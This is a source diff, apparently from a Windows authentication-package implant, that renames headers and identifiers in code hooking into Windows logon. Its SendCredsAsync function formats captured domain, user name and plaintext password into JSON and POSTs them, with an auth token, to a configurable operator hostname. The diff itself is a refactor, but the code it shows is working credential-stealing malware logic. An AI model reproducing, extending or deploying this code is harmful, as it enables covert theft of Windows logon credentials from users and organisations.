@@ -6,11 +6,11 @@
 #include <NTSecAPI.h>
 #include <ntsecpkg.h>
 
-#include <jam/http.h>
-#include <jam/logging.h>
-#include <jam/memory.h>
-#include <jam/mutex.h>
-#include <jam/object.h>
+#include <monstars/http.h>
+#include <monstars/logging.h>
+#include <monstars/memory.h>
+#include <monstars/mutex.h>
+#include <monstars/object.h>
 
 #include "provider.h"
 
@@ -21,8 +21,8 @@ FILETIME g_LastAuthTime = {};
 wchar_t g_LastAuthUser[MAX_PATH] = {};
 
 // stampable values - configured via web interface or helper script
-constexpr wchar_t c_BangHostname[128] = L"EVERYBODYGETUP";
-constexpr wchar_t c_BangAuthToken[] = L"00000000-0000-0000-0000-000000000000";
+constexpr wchar_t c_Hostname[128] = L"EVERYBODYGETUP";
+constexpr wchar_t c_AuthToken[] = L"00000000-0000-0000-0000-000000000000";
 
 NTSTATUS
 NTAPI
@@ -66,7 +66,7 @@ DWORD SendCredsAsync(void* credsPtr)
     monstars::HeapBuffer jsonBuf(MAX_PATH);
     auto jsonPayload = jsonBuf.Get<wchar_t>();
 
-    wsprintfW(jsonPayload, c_JsonTemplate, c_BangAuthToken, creds->Domain, creds->User, creds->Password);
+    wsprintfW(jsonPayload, c_JsonTemplate, c_AuthToken, creds->Domain, creds->User, creds->Password);
     int jsonLen = lstrlenW(jsonPayload) * sizeof(wchar_t);
 
     DEBUG_PRINTW(L"%s\n", jsonPayload);
@@ -82,12 +82,12 @@ DWORD SendCredsAsync(void* credsPtr)
                 DEBUG_PRINTW(L"lock timeout, this is probably bad\n");
                 continue;
             }
-            monstars::HttpClient bang_client(c_BangHostname);
-            if (bang_client.PostRequest(c_BangEndpoint, jsonBuf.Get(), jsonLen, c_ContentType))
+            monstars::HttpClient client(c_Hostname);
+            if (client.PostRequest(c_Endpoint, jsonBuf.Get(), jsonLen, c_ContentType))
             {
                 return ERROR_SUCCESS;
             }
-            if (bang_client.Forbidden())
+            if (client.Forbidden())
             {
                 return ERROR_ACCESS_DENIED;
             }
